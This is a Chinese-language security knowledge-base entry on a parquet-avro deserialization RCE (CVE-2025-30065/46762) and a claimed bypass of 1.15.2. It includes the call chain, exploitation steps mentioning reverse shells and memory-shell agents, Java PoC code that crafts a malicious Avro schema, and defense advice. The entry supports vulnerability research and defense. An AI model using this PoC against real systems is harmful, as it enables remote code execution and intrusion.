---
id: web-java-deserialization-parquet-avro-record-class-constructor-rce
title: Parquet Avro schema 指定 record 类经 SpecificData.newInstance 触发构造器 RCE（1.15.2 仍可绕过）
type: scenario
domain: web
path: web/java/deserialization
technique: parquet-avro-record-class-constructor-rce
aliases:
- CVE-2025-30065
- CVE-2025-46762
- Parquet Avro 反序列化 RCE
- java-class 构造器
- SpecificData.newInstance
- sun.print.PrintServiceLookupProvider
- ReflectClassValidator 绕过
tags:
- java
- parquet
- avro
- deserialization
- rce
- schema-injection
cve:
- CVE-2025-30065
- CVE-2025-46762
affected_versions: ≤1.15.1（CVE-2025-30065）、1.15.0 及之前（CVE-2025-46762）；1.15.2 仍被原文实测绕过
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V14
  verified_at: '2026-11-05T01:52:30+08:00'
  notes: 已对照原文与44张图（无09）核对；CVE-2025-30065/46762版本区间、1.15.1/1.15.2补丁、parquet.avro.schema->SpecificData.newInstance->Constructor、sun.print构造器execCmd、1.15.2构造器触发与agent上线均一致；未复现
---

## 一句话结论

用 specific/reflect 模型读取攻击者可控的 Parquet 文件时，Avro 会按 `parquet.avro.schema` 元数据里的 `name`/`namespace` 反射实例化 record 类并调用其无参构造器；1.15.1 的包白名单与 1.15.2 的 `ReflectClassValidator` 只校验 `java-class` 字段类，不校验 record 类本身，因此指定 `sun.print.PrintServiceLookupProvider` 等构造器有副作用的本地类即可 RCE。

## 原理

- Parquet 文件的 footer 元数据里可存 `parquet.avro.schema`（Avro schema JSON）。`AvroReadSupport.prepareForRead()` 会 `new Schema.Parser().parse(keyValueMetaData.get("parquet.avro.schema"))`，把攻击者的 schema 当权威结构。
- 读取记录时调用链为：
  ```text
  ParquetReader.read()
  → ParquetReader.initReader()
  → InternalParquetRecordReader.initialize()   # 解析 parquet.avro.schema
  → InternalParquetRecordReader.nextKeyValue()
  → RecordReaderImplementation.read()
  → AvroRecordConverter.start()
  → ReflectData.newRecord() → SpecificData.newRecord()
  → SpecificData.newInstance(Class c, Schema s)
  → Constructor.newInstance()                  # 实例化 schema 指定的类
  ```
- `SpecificData.newInstance()` 用 `CTOR_CACHE.apply(c)` 取无参构造器并 `newInstance()`；只要目标类在 classpath/JDK 中，构造器就被执行，与字段值无关（除非类实现 `SchemaConstructable` 时传入 schema）。
- 1.15.1 增加 `checkSecurity(Class)`，按 `org.apache.parquet.avro.SERIALIZABLE_PACKAGES`（默认 `java.lang,java.math,java.io,java.net,org.apache.parquet.avro`）限制包；1.15.2 增加 `ReflectClassValidator`。但两者都作用在 `FieldStringableConverter`（`java-class`/`java-key-class` 字段类型）等路径上；**record 类名来自 schema 的 name/namespace，在 `SpecificData.newInstance()` 前没有经过同一 validator**，因此仍可指定任意本地类。
- 利用类示例：Linux JDK 11 的 `sun.print.PrintServiceLookupProvider` 无参构造器会启动 `PrinterChangeListener`/`RemotePrinterChangeListener` 线程，监听线程刷新默认打印机时进入 `getDefaultPrinterNameBSD()` → `execCmd()`，内部用 `Runtime.getRuntime().exec(new String[]{"/bin/sh","-c", ...})` 执行命令；构造器副作用即命令执行。

## 触发条件

- 应用使用 parquet-avro 的 **specific** 或 **reflect** 数据模型读取不可信 Parquet（`AvroParquetReader...withDataModel(ReflectData.get())` 等）；generic 模型不受影响。
- 版本 ≤1.15.1 直接受影响；1.15.2 仍可用未被 validator 覆盖的 record 类构造器绕过。
- 目标 JDK/classpath 存在构造器可触发命令执行/危险副作用的类（Linux JDK 11 的 `sun.print.*` 是原文示例）。
- 攻击者能上传/提供被解析的 Parquet 文件。

## 利用步骤

1. 确认目标以 specific/reflect 模型读取 Parquet，且可上传文件。
2. 构造 Avro schema：`name`/`namespace` 指向目标类（如 `sun.print.PrintServiceLookupProvider`），字段按类需要构造（如 `defaultPrinter`/命令字段）。
3. 用该 schema 写一个 Parquet 文件（footer 中写入 `parquet.avro.schema` 元数据）。
4. 上传后触发 `reader.read()`；`SpecificData.newInstance` 实例化该类，构造器/线程执行命令。
5. 命令无回显时，用写文件/反弹 shell/后续内存马等方式验证（原文在 Docker 中反弹 shell，并用 parquet 分片写入 agent、`jcmd JVMTI.agent_load` 上线）。

## PoC

构造恶意 schema 并写 Parquet（节选自原文思路）：

```java
String schemaJson = "{"
    + "\"type\":\"record\","
    + "\"name\":\"sun.print.PrintServiceLookupProvider\","
    + "\"namespace\":\"sun.print\","
    + "\"fields\":[{"
    +   "\"name\":\"defaultPrinter\","
    +   "\"type\":\"string\","
    +   "\"default\":\"calc\""
    + "}]}";
Schema schema = new Schema.Parser().parse(schemaJson);

try (ParquetWriter<GenericRecord> writer = AvroParquetWriter.<GenericRecord>builder(new Path("users.parquet"))
        .withSchema(schema)
        .withCompressionCodec(CompressionCodecName.SNAPPY)
        .withConf(new Configuration())
        .build()) {
    GenericRecord record = new GenericData.Record(schema);
    record.put("defaultPrinter", "calc");
    writer.write(record);
}
```

受害者读取：

```java
try (ParquetReader<Object> reader = AvroParquetReader.builder(path)
        .withDataModel(ReflectData.get())
        .disableCompatibility()
        .build()) {
    while (reader.read() != null) { }
}
```

`sun.print.PrintServiceLookupProvider` 构造器关键副作用（JDK 11）：

```java
public PrintServiceLookupProvider() {
    // start the local printer listener thread
    Thread thr = new Thread(null, new PrinterChangeListener(), "PrinterListener", 0, false);
    thr.setDaemon(true);
    thr.start();
    ...
}
// 监听线程 → getDefaultPrintService → getDefaultPrinterNameBSD → execCmd
// execCmd 最终 Runtime.getRuntime().exec(new String[]{"/bin/sh","-c", cmd})
```

## 变体与关联

- 1.15.1 的 `checkSecurity` 只看工厂/字段类包名，默认信任包仍包含 `java.lang` 等；1.15.2 的 `ReflectClassValidator.PackageValidator` 同样只覆盖 `java-class` 转换路径。
- 其他构造器有副作用的类可替换 `sun.print.*`（视 JDK/依赖而定）；任何被反射实例化的本地类都可能成为“构造器 gadget”。
- `java-class`/`java-key-class` 字段本身也值得测：`FieldStringableConverter` 会用 `getConstructor(String.class).newInstance(...)` 实例化字段类，1.15.x 有包校验但仍可能存在允许包内的危险类。
- 无回显时原文采用“命令写文件 + 分片 base64 + jcmd JVMTI.agent_load”上线内存马；agent 加载部分已有 `web-java-classloader-attach-api-jvmti-agent-memory-shell` 覆盖。
- 关联：Jackson/Avro/SnakeYAML 等“schema/类型可控 → 反射实例化”类漏洞；Fastjson AutoType 本质相同。

## 检测与防御

- 不要用 specific/reflect 模型解析不可信 Parquet；使用 generic 模型或先校验 schema。
- 升级到修复版本并设置 `org.apache.parquet.avro.SERIALIZABLE_PACKAGES` 为空（1.15.1 缓解）；但注意 1.15.2 仍可能被 record 类构造器绕过，需应用层白名单。
- 应用层校验 `parquet.avro.schema` 的 `name`/`namespace`/`java-class`/`java-key-class`，只允许业务模型类，拒绝 JDK 内部类与任意包。
- 读取 Parquet 的进程降低权限，限制出网与文件写入；对上传文件做格式与 schema 检查。
- 监控 Parquet footer schema 中出现 `sun.print.*`、`java-class` 指向非业务类、`SERIALIZABLE_PACKAGES` 异常等特征。
